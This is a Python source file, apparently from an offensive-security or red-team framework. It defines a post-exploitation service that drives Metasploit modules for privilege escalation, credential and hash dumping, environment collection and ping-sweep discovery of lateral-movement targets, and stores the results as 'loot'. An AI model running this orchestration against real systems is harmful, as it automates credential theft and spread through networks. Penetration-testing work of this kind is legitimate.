"""Post-exploitation bounded context — domain service.

Orchestrates post-exploitation operations: privilege escalation, credential
harvesting, data collection, and lateral movement planning.
"""

from __future__ import annotations

import logging
from typing import Any

from miya.shared.events import DomainEvent
from miya.shared.ports import EventStorePort, ExploitFrameworkPort
from miya.oneday.post.domain import (
    PostSession,
    AccessLevel,
    LootItem,
    PivotTarget,
)

logger = logging.getLogger(__name__)


class PostService:
    """Domain service for the post-exploitation bounded context.

    Coordinates post-exploitation operations using Metasploit meterpreter
    sessions and other post-exploitation tools.
    """

    def __init__(
        self,
        event_store: EventStorePort,
        exploit_framework: ExploitFrameworkPort | None = None,
    ) -> None:
        self._event_store = event_store
        self._exploit_fw = exploit_framework

    async def create_session(
        self,
        session_id: str,
        target_host: str,
        initial_access: str = "user",
        username: str = "",
    ) -> PostSession:
        """Create a new post-exploitation session."""
        session = PostSession(
            session_id=session_id,
            target_host=target_host,
            access_level=AccessLevel(
                level=initial_access,
                username=username,
            ),
        )
        return session

    async def attempt_privesc(
        self,
        session: PostSession,
        technique: str,
        correlation_id: str = "",
    ) -> bool:
        """Attempt privilege escalation using a specific technique."""
        if self._exploit_fw:
            result = await self._exploit_fw.run_exploit(
                module=technique,
                options={"SESSION": session.session_id},
            )

            if result.get("success"):
                session.escalate_privileges(
                    to_level=result.get("access_level", "root"),
                    username=result.get("username", ""),
                    technique=technique,
                    correlation_id=correlation_id,
                )

                events = session.collect_events()
                if events:
                    await self._event_store.append(events)
                return True
            return False

        return False

    async def harvest_credentials(
        self,
        session: PostSession,
        correlation_id: str = "",
    ) -> list[LootItem]:
        """Harvest credentials from the compromised system."""
        collected: list[LootItem] = []

        if self._exploit_fw:
            # Run credential harvesting modules
            modules = [
                "post/multi/gather/credentials",
                "post/linux/gather/hashdump",
                "post/windows/gather/hashdump",
            ]

            for module in modules:
                try:
                    result = await self._exploit_fw.run_exploit(
                        module=module,
                        options={"SESSION": session.session_id},
                    )

                    for cred in result.get("credentials", []):
                        item = session.collect_loot(
                            loot_type="credential",
                            description=f"{cred.get('username', '')}:{cred.get('secret', '')}",
                            content=cred.get("raw", ""),
                            source=module,
                            correlation_id=correlation_id,
                        )
                        collected.append(item)
                except Exception as exc:
                    logger.debug("Credential module %s skipped: %s", module, exc)
                    continue  # module may not be applicable to this OS

        events = session.collect_events()
        if events:
            await self._event_store.append(events)

        return collected

    async def collect_system_info(
        self,
        session: PostSession,
        correlation_id: str = "",
    ) -> list[LootItem]:
        """Collect system information and configuration files."""
        collected: list[LootItem] = []

        if self._exploit_fw:
            result = await self._exploit_fw.run_exploit(
                module="post/multi/gather/env",
                options={"SESSION": session.session_id},
            )

            if result.get("data"):
                item = session.collect_loot(
                    loot_type="config",
                    description="System environment and configuration",
                    content=str(result["data"]),
                    source="post/multi/gather/env",
                    correlation_id=correlation_id,
                )
                collected.append(item)

        events = session.collect_events()
        if events:
            await self._event_store.append(events)

        return collected

    async def discover_pivot_targets(
        self,
        session: PostSession,
        correlation_id: str = "",
    ) -> list[PivotTarget]:
        """Discover lateral movement targets from the compromised system."""
        pivots: list[PivotTarget] = []

        if self._exploit_fw:
            result = await self._exploit_fw.run_exploit(
                module="post/multi/gather/ping_sweep",
                options={"SESSION": session.session_id},
            )

            for host_data in result.get("hosts", []):
                pivot = PivotTarget(
                    host=host_data.get("hostname", ""),
                    ip=host_data.get("ip", ""),
                    port=host_data.get("port", 0),
                    service=host_data.get("service", ""),
                    route=f"via session {session.session_id}",
                    confidence=host_data.get("confidence", "low"),
                )
                session.add_pivot_target(pivot)
                pivots.append(pivot)

        return pivots

    async def load_session(self, session_id: str) -> PostSession:
        """Reconstitute a PostSession from the event store."""
        events = await self._event_store.load(session_id)
        session = PostSession(id=session_id)
        for event in events:
            session.apply(event)
        return session
